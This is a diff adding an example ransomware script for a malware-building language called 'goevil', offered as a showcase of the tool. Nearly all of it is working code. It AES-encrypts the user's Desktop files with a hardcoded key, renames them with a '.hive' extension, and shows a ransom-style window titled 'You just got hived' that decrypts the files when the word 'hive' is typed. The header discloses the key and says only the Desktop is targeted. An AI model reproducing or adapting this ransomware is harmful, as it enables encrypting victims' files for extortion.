@@ -1,0 +1,72 @@
+@ Warning: This is an example ransomware to showcase what goevil can do @
+
+@ In the case of accidental encryption know the following @
+@ 1. The encryption method is AES @
+@ 2. The key length is 16 bytes @
+@ 3. The encryption key used is hiveXXXXXXXXXXXX @
+@ 4. The ransomware only targets the current running user's Desktop directory @
+@ 5. The source code is not obfuscated @
+@ 6. The ransomware is built for linux, check the 'alien_windows' for the windows version @ 
+
+use window
+use system
+use crypto
+use time
+
+[
+    version 2.0
+    output alien
+    os linux
+    arch amd64
+    obfuscate false
+]
+
+c decrypt_files {
+    crypto::clean_targets() @ Remove all our prevously gathered targets @
+    crypto::set_extension(".cleared")
+    crypto::set_aes_key("hiveXXXXXXXXXXXX")
+    crypto::set_method("aes")    
+    
+    system::list_dir(${"file", "€40€/Desktop"}$) @ Puts the result into €1€ @
+    foreach("€2€"):
+        crypto::add_target("€13€") @ Add each file to our target list @
+    end foreach
+
+    crypto::decrypt()
+}
+
+b encrypt_files {
+    crypto::set_extension(".hive")
+    crypto::set_aes_key("hiveXXXXXXXXXXXX")
+    crypto::set_method("aes")
+
+    system::list_dir(${"file", "€40€/Desktop"}$) @ Puts the result into €1€ @
+    foreach("€1€"):
+        crypto::add_target("€13€") @ Add each file to our target list @
+    end foreach
+
+    crypto::encrypt()
+}
+
+l window_run {
+    window::bind(${"decrypt", "decrypt_files"}$)
+
+    window::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt(); window.alert('Successfully decrypted files')}else{window.alert('Enter hive into the text box')}}")
+
+    window::css("body{ background-image:url('https://raw.githubusercontent.com/TeamPhoneix/go-evil/v2/examples/ransomware/Alien/background.jpg'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
+    window::css("label{color: #555;}")
+    window::css("#input_box {position: absolute; bottom: 0; left: 50%; background-color: #DBF9FC;}")
+
+    window::html("<div id='input_box'>")
+    window::html("<label for='in'>Input</label>")
+    window::html("<input id='in' type='input'>")
+    window::html("<input type='submit' onclick='checking()'>")
+    window::html("</div>")
+
+    window::width("934")
+    window::height("580")
+    window::title("You just got hived")
+
+    window::run()
+    system::exit("0")
+}
